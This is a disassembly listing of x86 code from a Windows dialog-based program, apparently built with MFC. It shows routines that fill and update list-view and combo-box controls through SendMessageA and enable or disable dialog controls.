push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn
mov eax [ rw-data ]
push edi
mov [ esp + 0xc ] eax
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push eax
mov [ esp + 0x50 ] 0x1
call edi
cmp eax 0x4
ja r-xdata
push 0x0
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn
mov ecx [ esp + 0x8 ]
push rw-data
push ecx
call sub_41051e
add esp 0x8
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_406bc4 ]
mov eax [ esi + 0xd8 ]
mov ecx [ esi + 0xd4 ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
call sub_41dba7
add esp 0x10
mov edx [ esi + 0xd8 ]
mov eax [ esi + 0xd4 ]
mov ecx [ esp + 0x8 ]
push edx
push eax
push ecx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_41dba7
add esp 0x14
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
mov eax [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x1004
push eax
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x28 ] 0x0
call edi
mov ecx [ esp + 0xc ]
mov [ esp + 0x14 ] eax
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0xc ]
push eax
call sub_422745
lea edx [ esp + 0x10 ]
mov [ esp + 0x24 ] eax
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x1007
push eax
call edi
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x1004
push ecx
call edi
mov edx [ esi + 0xb4 ]
dec eax
push 0x1
push eax
push 0x1013
push edx
call edi
lea ecx [ esp + 0x8 ]
mov [ esp + 0x40 ] 0x0
call sub_422478
lea ecx [ esp + 0xc ]
mov [ esp + 0x40 ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x38 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn
lea ecx [ esp + 0xc ]
call sub_422601
sub_406be0
push esi
push edi
mov edi ecx
lea eax [ edi + 0x98 ]
test eax eax
je r-xdata
mov esi [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
push 0x100c
push eax
call esi
cmp eax 0xffffffff
push 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
push eax
mov eax [ edi + 0xb4 ]
push 0x1008
push eax
call esi
pop edi
pop esi
retn
push rw-data
push rw-data
mov ecx edi
call sub_420904
pop edi
pop esi
retn
sub_406c30
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov edi ecx
cmp [ ebx + 0x4 ] 0x100
jne r-xdata
push ebx
mov ecx edi
call sub_41e66d
pop edi
pop ebx
retn 0x4
cmp [ ebx + 0x8 ] 0x2e
jne r-xdata
lea eax [ edi + 0x98 ]
test eax eax
je r-xdata
push esi
mov esi [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
push 0x100c
push eax
call esi
push 0x0
push eax
mov eax [ edi + 0xb4 ]
push 0x1008
push eax
call esi
pop esi
mov eax [ eax + 0x1c ]
sub_406c90
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0xdc ]
test eax eax
je r-xdata
push 0x0
push 0x422
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x423
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x424
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x422
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x423
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x424
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x425
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_406da0
push 0xffffffff
push sub_42a7e1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x93
mov [ esp + 0x10 ] esi
call sub_41ea14
lea edi [ esi + 0x60 ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0x9c ]
mov [ esp + 0x14 ] 0x1
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0xd8 ]
mov [ esp + 0x14 ] 0x2
mov ecx edi
call sub_41efc6
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov [ esi ] r--data
mov [ esi + 0x114 ] 0x0
mov [ esi + 0x118 ] 0x0
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_406e70
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x60 ]
push eax
push 0x417
push edi
call sub_425678
lea ecx [ esi + 0x9c ]
push ecx
push 0x401
push edi
call sub_425678
lea edx [ esi + 0xd8 ]
push edx
push 0x415
push edi
call sub_425678
lea eax [ esi + 0x114 ]
push eax
push 0x414
push edi
call sub_425626
add esi 0x118
push esi
push 0x400
push edi
call sub_425626
pop edi
pop esi
retn 0x4
sub_406ef0
push 0xffffffff
push sub_42a810
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_41ed51
mov edi [ SendMessageA@IAT ]
xor ebp ebp
lea eax [ esp + 0x1c ]
mov [ esi + 0x5c ] ebp
mov ecx [ esi + 0xf4 ]
push eax
push ebp
push 0x101b
push ecx
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x40 ] ebp
mov [ esp + 0x34 ] 0xf0
mov [ esp + 0x38 ] rw-data
call edi
mov eax [ esi + 0xb8 ]
lea edx [ esp + 0x1c ]
push edx
push ebp
push 0x101b
push eax
mov [ esp + 0x38 ] rw-data
call edi
mov eax [ rw-data ]
mov [ esp + 0x3c ] 0x1
mov [ esp + 0x44 ] ebp
mov [ esp + 0x10 ] eax
mov [ esp + 0x6c ] ebp
mov [ esp + 0x14 ] eax
mov [ esp + 0x6c ] 0x1
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebp
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ebx eax
xor eax eax
cmp ebx ebp
jle r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebp
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ebx eax
xor eax eax
cmp ebx ebp
jle r-xdata
lea ebp [ eax + 0x1 ]
lea ecx [ esp + 0x14 ]
push ebp
push rw-data
push ecx
call sub_41dba7
add esp 0xc
call sub_4272f7
mov edx [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
push 0x0
push edx
lea ecx [ esp + 0x20 ]
push rw-data
push ecx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x70 ] 0x2
call sub_4225b1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6c ] 0x1
call sub_422478
mov edx [ esi + 0xf4 ]
push 0x0
push 0x0
push 0x1004
push edx
call edi
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x10 ]
mov eax [ eax - 0x8 ]
push eax
call sub_422745
mov edx [ esi + 0xf4 ]
lea ecx [ esp + 0x3c ]
push ecx
push 0x0
push 0x1007
push edx
mov [ esp + 0x60 ] eax
call edi
mov eax ebp
cmp eax ebx
jl r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebp
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x114 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebp
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x118 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebp
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
lea ebp [ eax + 0x1 ]
lea eax [ esp + 0x14 ]
push ebp
push rw-data
push eax
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x70 ] 0x3
call sub_4225b1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6c ] 0x1
call sub_422478
mov eax [ esi + 0xf4 ]
push 0x0
push 0x0
push 0x1004
push eax
call edi
mov ecx [ esp + 0x10 ]
mov [ esp + 0x40 ] eax
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x10 ]
push eax
call sub_422745
lea edx [ esp + 0x3c ]
mov [ esp + 0x50 ] eax
mov eax [ esi + 0xb8 ]
push edx
push 0x0
push 0x1007
push eax
call edi
mov eax ebp
cmp eax ebx
jl r-xdata
xor ebp ebp
sub eax 0x27
sub eax 0x61
jmp r-xdata
xor ebp ebp
push ebp
push 0x415
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push ebp
push 0x41a
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push ebp
push 0x1
push 0x415
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x41a
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
mov ecx [ esi + 0x7c ]
push ebp
push eax
push 0x14e
push ecx
call edi
cmp [ esi + 0x114 ] ebp
je r-xdata
push ebp
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push ebp
push 0x419
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push ebp
push 0x418
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push ebp
push 0x1
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x419
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x418
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x416
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
cmp [ esi + 0x118 ] ebp
je r-xdata
push 0x417
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push ebp
mov ecx esi
call sub_421060
lea ecx [ esp + 0x14 ]
mov [ esp + 0x6c ] 0x0
call sub_422478
lea ecx [ esp + 0x10 ]
mov [ esp + 0x6c ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x64 ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x60
retn
sub_4072e0
push 0xffffffff
push sub_42a849
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xdc
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x38 ]
mov [ esp + 0xf0 ] 0x0
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x18 ] 0x0
call sub_401230
mov ecx [ esi + 0x5c ]
mov [ esp + 0xec ] 0x1
mov [ esp + 0xd4 ] ecx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x94 ] 0x1
call sub_41eac9
mov edi [ SendMessageA@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0xf4 ]
push 0x0
push 0x0
push 0x1004
push edx
call edi
dec eax
push 0x1
push eax
mov eax [ esi + 0xf4 ]
push 0x1013
push eax
call edi
lea ecx [ esp + 0xd8 ]
mov [ esp + 0xec ] 0x3
call sub_422478
lea ecx [ esp + 0x98 ]
mov [ esp + 0xec ] 0x2
call sub_426127
lea ecx [ esp + 0x34 ]
mov [ esp + 0xec ] 0x0
call sub_41e7a7
lea ecx [ esp + 0x8 ]
mov [ esp + 0xec ] 0xffffffff
call sub_422478
mov ecx [ esp + 0xe4 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xe8
retn
mov ecx [ esp + 0xdc ]
mov eax [ esp + 0xd4 ]
test ecx ecx
mov [ esi + 0x5c ] eax
push eax
je r-xdata
mov edx [ esp + 0x94 ]
push edx
push rw-data
mov edx [ esp + 0xdc ]
push edx
push rw-data
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_41dba7
mov ecx [ esi + 0xf4 ]
add esp 0x10
push 0x0
push 0x0
push 0x1004
push ecx
call edi
mov edx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x8 ]
mov eax [ edx - 0x8 ]
push eax
call sub_422745
mov ecx [ esi + 0xf4 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x1007
push ecx
call edi
sub_407470
push 0xffffffff
push sub_42a889
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xdc
push esi
mov esi ecx
push edi
push 0x0
lea ecx [ esp + 0x38 ]
call sub_401230
mov eax [ rw-data ]
mov [ esp + 0xec ] 0x0
mov [ esp + 0x8 ] eax
mov ecx [ esi + 0x5c ]
mov [ esp + 0xec ] 0x1
mov [ esp + 0xd4 ] ecx
lea ecx [ esp + 0x34 ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x94 ] 0x2
call sub_41eac9
mov edi [ SendMessageA@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0xb8 ]
push 0x0
push 0x0
push 0x1004
push edx
call edi
dec eax
push 0x1
push eax
mov eax [ esi + 0xb8 ]
push 0x1013
push eax
call edi
lea ecx [ esp + 0x8 ]
mov [ esp + 0xec ] 0x0
call sub_422478
lea ecx [ esp + 0xd8 ]
mov [ esp + 0xec ] 0x3
call sub_422478
lea ecx [ esp + 0x98 ]
mov [ esp + 0xec ] 0x2
call sub_426127
lea ecx [ esp + 0x34 ]
mov [ esp + 0xec ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0xe4 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xe8
retn
mov eax [ esp + 0xd4 ]
mov edx [ esp + 0xd8 ]
mov [ esi + 0x5c ] eax
push eax
push edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_41dba7
mov ecx [ esi + 0xb8 ]
add esp 0x10
push 0x0
push 0x0
push 0x1004
push ecx
call edi
mov edx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x8 ]
mov eax [ edx - 0x8 ]
push eax
call sub_422745
mov ecx [ esi + 0xb8 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x1007
push ecx
call edi
sub_4075e0
push esi
push edi
mov edi ecx
lea eax [ edi + 0xd8 ]
test eax eax
je r-xdata
mov esi [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
push 0x100c
push eax
call esi
cmp eax 0xffffffff
push 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
push eax
mov eax [ edi + 0xf4 ]
push 0x1008
push eax
call esi
pop edi
pop esi
retn
push rw-data
push rw-data
mov ecx edi
call sub_420904
pop edi
pop esi
retn
sub_407630
push esi
push edi
mov edi ecx
lea eax [ edi + 0x9c ]
test eax eax
je r-xdata
mov esi [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
push 0x100c
push eax
call esi
cmp eax 0xffffffff
push 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
push eax
mov eax [ edi + 0xb8 ]
push 0x1008
push eax
call esi
pop edi
pop esi
retn
push rw-data
push rw-data
mov ecx edi
call sub_420904
pop edi
pop esi
retn
sub_407680
push 0xffffffff
push sub_42a8b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x1
call sub_421060
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebp + 0xf4 ]
xor esi esi
push esi
push esi
push 0x1004
push ecx
mov [ esp + 0x30 ] esi
call [ SendMessageA@IAT ]
mov ebx eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
cmp [ ebp + 0x114 ] 0x1
jne r-xdata
cmp ebx esi
cmp ebx esi
jne r-xdata
call sub_4272f7
mov edx [ ebp + 0x114 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov eax [ ebp + 0xb8 ]
xor esi esi
push esi
push esi
push 0x1004
push eax
call [ SendMessageA@IAT ]
mov ebx eax
mov eax [ ebp + 0x118 ]
cmp eax 0x1
jne r-xdata
lea edi [ esi + 0x1 ]
lea edx [ esp + 0x10 ]
push edi
push rw-data
push edx
call sub_41dba7
add esp 0xc
lea eax [ esp + 0x14 ]
lea ecx [ ebp + 0xd8 ]
push 0x0
push esi
push eax
call sub_41dda4
mov esi [ eax ]
mov [ esp + 0x20 ] 0x1
call sub_4272f7
mov ecx [ esp + 0x10 ]
mov eax [ eax + 0x4 ]
push esi
push ecx
push rw-data
mov ecx eax
call sub_425ad4
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_422478
mov esi edi
cmp esi ebx
jl r-xdata
jle r-xdata
push esi
push rw-data
push rw-data
mov ecx ebp
call sub_420904
mov [ ebp + 0x114 ] esi
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
cmp ebx esi
jle r-xdata
cmp ebx esi
jne r-xdata
call sub_4272f7
mov edx [ ebp + 0x118 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov eax [ ebp + 0x7c ]
push 0x0
push 0x0
push 0x147
push eax
call [ SendMessageA@IAT ]
mov esi eax
cmp esi 0x1a
jge r-xdata
lea edi [ esi + 0x1 ]
lea ecx [ esp + 0x10 ]
push edi
push rw-data
push ecx
call sub_41dba7
add esp 0xc
lea edx [ esp + 0x14 ]
lea ecx [ ebp + 0x9c ]
push 0x0
push esi
push edx
call sub_41dda4
mov esi [ eax ]
mov [ esp + 0x20 ] 0x2
call sub_4272f7
mov ecx [ esp + 0x10 ]
mov eax [ eax + 0x4 ]
push esi
push ecx
push rw-data
mov ecx eax
call sub_425ad4
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_422478
mov esi edi
cmp esi ebx
jl r-xdata
push esi
push rw-data
push rw-data
mov ecx ebp
call sub_420904
mov [ ebp + 0x118 ] esi
add esi 0x27
add esi 0x61
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push esi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov ecx ebp
call sub_41edb6
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4078d0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push edi
mov ebx ecx
cmp [ ebp + 0x4 ] 0x100
jne r-xdata
push ebp
mov ecx ebx
call sub_41e66d
pop edi
pop ebp
pop ebx
retn 0x4
cmp [ ebp + 0x8 ] 0x2e
jne r-xdata
lea eax [ ebx + 0xd8 ]
test eax eax
je r-xdata
mov edi [ SendMessageA@IAT ]
push esi
push 0x2
push 0xffffffff
push 0x100c
push eax
call edi
mov esi eax
mov eax [ ebx + 0xf4 ]
push 0x0
push esi
push 0x1008
push eax
call edi
cmp esi 0xffffffff
pop esi
jne r-xdata
mov eax [ eax + 0x1c ]
lea eax [ ebx + 0x9c ]
test eax eax
je r-xdata
push 0x2
push 0xffffffff
push 0x100c
push eax
call edi
cmp eax 0xffffffff
je r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebx + 0xb8 ]
push 0x0
push eax
push 0x1008
push ecx
call edi
sub_407960
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x114 ]
test eax eax
je r-xdata
push 0x0
push 0x415
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x41a
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x415
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x41a
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x416
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_4079f0
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x118 ]
test eax eax
je r-xdata
push 0x0
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x419
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x418
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x419
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x418
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x417
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_407aa0
push 0xffffffff
push sub_42a8d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x98
mov [ esp + 0x10 ] esi
call sub_41ea14
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_41efc6
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov [ esi ] r--data
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x9c ] 0x0
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_407b40
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x428
push edi
call sub_425678
lea ecx [ esi + 0x98 ]
push ecx
push 0x413
push edi
call sub_4255a5
add esi 0x9c
push esi
push 0x3fc
push edi
call sub_425626
pop edi
pop esi
retn 0x4
sub_407b90
push 0xffffffff
push sub_42a927
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
mov eax [ rw-data ]
push esi
mov esi ecx
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x4 ] eax
push 0x0
lea ecx [ esp + 0x34 ]
mov [ esp + 0x118 ] 0x0
call sub_401520
lea ecx [ esp + 0x30 ]
mov [ esp + 0x114 ] 0x1
call sub_41eac9
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0xd0 ]
mov [ esp + 0x114 ] 0x4
call sub_426127
lea ecx [ esp + 0x94 ]
mov [ esp + 0x114 ] 0x3
call sub_426127
lea ecx [ esp + 0x90 ]
mov [ esp + 0x114 ] 0x2
call sub_422478
lea ecx [ esp + 0x30 ]
mov [ esp + 0x114 ] 0x0
call sub_41e7a7
lea ecx [ esp + 0x4 ]
mov [ esp + 0x114 ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x10c ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x114
retn
mov ecx [ esp + 0x8c ]
mov edx [ esp + 0x90 ]
add ecx 0x61
push edi
push ecx
push edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_41dba7
mov ecx [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
add esp 0x10
push 0x0
push 0x0
push 0x1004
push ecx
call edi
mov edx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x8 ]
mov eax [ edx - 0x8 ]
push eax
call sub_422745
mov ecx [ esi + 0x78 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x1007
push ecx
call edi
pop edi
sub_407ce0
push 0xffffffff
push sub_42a980
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x1
call sub_421060
mov eax [ rw-data ]
mov [ esp + 0x18 ] eax
xor esi esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x3c ] esi
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x78 ]
push esi
push esi
mov bl 0x3
push 0x1004
push eax
mov [ esp + 0x4c ] bl
call [ SendMessageA@IAT ]
mov ebp eax
mov eax [ edi + 0x9c ]
cmp eax 0x1
mov [ esp + 0x20 ] ebp
jne r-xdata
call sub_4272f7
mov ecx [ edi + 0x9c ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
cmp ebp esi
jle r-xdata
cmp ebp esi
jne r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push ebp
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov ecx [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425ad4
call sub_4272f7
mov edx [ esp + 0x1c ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425ad4
call sub_4272f7
mov ecx [ edi + 0x98 ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov ecx edi
call sub_41edb6
lea ecx [ esp + 0x1c ]
mov [ esp + 0x3c ] 0x2
call sub_422478
lea ecx [ esp + 0x14 ]
mov [ esp + 0x3c ] 0x1
call sub_422478
lea ecx [ esp + 0x10 ]
mov [ esp + 0x3c ] 0x0
call sub_422478
lea ecx [ esp + 0x18 ]
mov [ esp + 0x3c ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x34 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
lea ebp [ edi + 0x5c ]
push esi
push rw-data
push rw-data
mov ecx edi
call sub_420904
mov [ edi + 0x9c ] esi
mov eax [ esp + 0x10 ]
push rw-data
push eax
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422706
mov ecx [ esp + 0x10 ]
push rw-data
push ecx
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422706
lea edx [ esp + 0x30 ]
push 0x1
push edx
lea ecx [ esp + 0x20 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x7
call sub_4225b1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x3c ] bl
call sub_422478
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x1c ]
push eax
call sub_42272d
mov eax [ esp + 0x20 ]
inc esi
cmp esi eax
jl r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422706
push 0x0
lea edx [ esp + 0x28 ]
push esi
push edx
mov ecx ebp
call sub_41dda4
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x40 ] 0x4
call sub_4225b1
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] bl
call sub_422478
lea eax [ esp + 0x28 ]
push 0x9
push eax
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x5
call sub_4225b1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x3c ] bl
call sub_422478
lea ecx [ esp + 0x2c ]
push 0x2
push ecx
lea ecx [ esp + 0x18 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x6
call sub_4225b1
lea ecx [ esp + 0x2c ]
mov [ esp + 0x3c ] bl
call sub_422478
mov edx [ esp + 0x10 ]
push rw-data
push edx
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
mov ebp eax
sub_407fa0
push 0xffffffff
push sub_42a9c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6c
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_41ed51
mov eax [ rw-data ]
mov [ esp + 0x20 ] eax
xor edi edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x84 ] edi
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] eax
mov ecx [ esi + 0x78 ]
mov ebp [ SendMessageA@IAT ]
lea eax [ esp + 0x34 ]
mov [ esp + 0x84 ] 0x3
push eax
push edi
push 0x101b
push ecx
mov [ esp + 0x64 ] 0x1
mov [ esp + 0x6c ] edi
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x48 ] 0x2
mov [ esp + 0x58 ] edi
